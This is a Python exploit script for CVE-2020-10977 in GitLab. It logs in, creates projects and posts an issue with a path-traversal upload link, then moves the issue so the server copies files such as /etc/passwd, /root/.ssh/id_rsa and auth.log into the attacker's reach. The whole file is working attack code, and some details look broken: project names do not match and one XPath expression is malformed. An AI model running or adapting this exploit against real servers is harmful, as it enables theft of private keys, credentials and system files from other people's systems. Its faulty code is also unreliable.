import requests
import lxml.html
from log_colors import *
import random
import json
import urllib.parse
import argparse
import time

requests.packages.urllib3.disable_warnings()

# CVE-2020-10977
class CVE2020_10977:
    headers = {"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"}
    def __init__(self, url, username, password):
        self.url = url
        self.username, self.password = username, password
        self.session = requests.Session()
   
    # get csrf token from page
    def get_csrf_token(self, url):
        r = self.session.get(
                self.url + url,
                headers = self.headers, verify = False
                )
        if r.ok:
            tree = lxml.html.fromstring(r.text)
            csrf_param = tree.xpath(".//meta[contains(@name, 'csrf-param')]")[0]
            csrf_token = tree.xpath(".//meta[contains(@name, 'csrf-token')]")[0]
            self.csrf_param = csrf_param.attrib["content"]
            self.csrf_token = csrf_token.attrib["content"]
            print (LogColors.BLUE + "successfully get csrf token..." + LogColors.ENDC)
        return self.csrf_param, self.csrf_token, r.text

    # login to gitlab
    def login(self):
        self.get_csrf_token('/users/sign_in')
        data = {
            'utf8=' : '✓',
            'user[login]' : self.username,
            'user[password]' : self.password,
            self.csrf_param : self.csrf_token,
            }
        r = self.session.post(
                # url + '/users/auth/ldapmain/callback',
                url + '/users/sign_in',
                data = data, headers = self.headers, allow_redirects = False,
                )
        if r.status_code == 302 and r.text.find("redirected") > -1:
            print (LogColors.GREEN + "successfully log in to giltab..." + LogColors.ENDC)

    # create new project
    def create_project(self, name):
        [_,_, page] = self.get_csrf_token('/projects/new')
        tree = lxml.html.fromstring(page)
        namespace = tree.xpath(".//form[contains(@class,'new_project')]" + \
                "//select[contains(@class, 'namespace')]//options[contains(@data-options-parent), 'users']"
                )[0]
        namespace = namespace.attrib["value"]
        data = {
            'utf8=' : '✓',
            'project[ci_cd_only]' : 'false',
            'project[name]' : name,
            'project[namespace_id]' : namespace,
            'project[path]' : name,
            'project[description]' : '',
            'project[visibility_level]' : '0',
            self.csrf_param : self.csrf_token,
            }
        r = self.session.post(
                self.url + '/projects',
                data = data, headers = self.headers, allow_redirects = False, verify = False
            )
        if r.status_code == 302:
            print (LogColors.BLUE + 'new project {} successfully created...'.format(name) + LogColors.ENDC)

    # create new issue with file
    def create_issue(self, project, name, f):
        self.issue_url = '/{}/{}/issues/new'.format(self.username, project)
        self.get_csrf_token(self.issue_url)
        
        data = {
            'utf8=' : '✓',
            self.csrf_param : self.csrf_token,
            'issue[title]' : name,
            'issue[description]' : '![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../..{})'.format(f),
            'issue[confidential]' : '0',
            'issue[assignee_ids][]' : '0',
            'issue[label_ids][]' : '',
            'issue[due_date]' : '',
            'issue[lock_version]' : '0',
        }
        
        r = self.session.post(
                self.url + '/{}/{}/issues'.format(self.username, project),
                data = data, headers = self.headers, allow_redirects = False, verify = False,
            )
        if r.status_code == 302:
            self.issue_url = r.headers["Location"]
            print (LogColors.BLUE + 'new issue created {}'.format(self.issue_url) + LogColors.ENDC)
    
    # move last issue
    def move_issue(self, source, dest, f):
        r = self.session.get(
                url = self.url + '/{}/{}'.format(self.username, dest),
                headers = self.headers,
            )
        tree = lxml.html.fromstring(r.text)
        project_id = tree.xpath(".//div[contains(@class, 'search-form')]")
        project_id = project_id[0].xpath(".//form//input[contains(@id, 'search_project_id')]")
        project_id = project_id[0].attrib["value"]

        r = self.session.get(self.issue_url, headers = self.headers, verify = False,)
        tree = lxml.html.fromstring(r.text)
        csrf_token = tree.xpath(".//meta[contains(@name, 'csrf-token')]")[0]
        csrf_token = csrf_token.attrib["content"]
        headers = {
            'X-CSRF-Token' : csrf_token,
            'X-Requested-With' : 'XMLHttpRequest',
            'Content-Type' : 'application/json;charset=utf-8'
        }
        data = json.dumps({
            "move_to_project_id" : int(project_id)
        })
        r = self.session.post(
                self.issue_url + '/move',
                headers = headers, data = data, allow_redirects = False,
            )
        if r.status_code == 500:
            print (LogColors.RED + "permission denied for file {}".format(f) + LogColors.ENDC)
        else:
            description = json.loads(r.text)["description"]
            i = description.find("/")
            file_url = self.url + "/{}/{}/{}".format(self.username, dest, description[i + 1 : -1])

            print (LogColors.GREEN + "url of file {}: {}\n".format(f, file_url) + LogColors.ENDC)
            r = self.session.get(file_url, headers = self.headers, verify = False)
 
            if r.status_code == 404:
                print(LogColors.RED + "no such file or directory: {}\n".format(f) + LogColors.ENDC)
            else:
                print (LogColors.BLUE + "content of file {} read from server...\n\n".format(f) + LogColors.ENDC)
                print (LogColors.YELLOW + r.text + "\n" + LogColors.ENDC)
                print (LogColors.GREEN + "hacked :)" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', required = True, help = "target gitlab url")
    parser.add_argument('-u','--username', required = True, help = "gitlab username")
    parser.add_argument('-p','--password', required = True, help = "gitlab password")
    args = vars(parser.parse_args())
    url = args['target']
    username, password = args["username"], args["password"]
    cve = CVE2020_10977(url, username, password)
    cve.login()
    cve.create_project("exploit_test_proj1")
    cve.create_project("exploit_test_proj2")
    files = [
        '/etc/passwd',
        '/etc/ssh/sshd_config',
        '/etc/ssh/ssh_config',
        '/root/.ssh/id_rsa',
        '/var/log/auth.log',
    ]
    for f in files:
        cve.create_issue("exploit_test_proj01", "exp_issue_{}".format(f), f)
        cve.move_issue("exploit_test_proj01", "exploit_test_proj02", f)
        time.sleep(5)

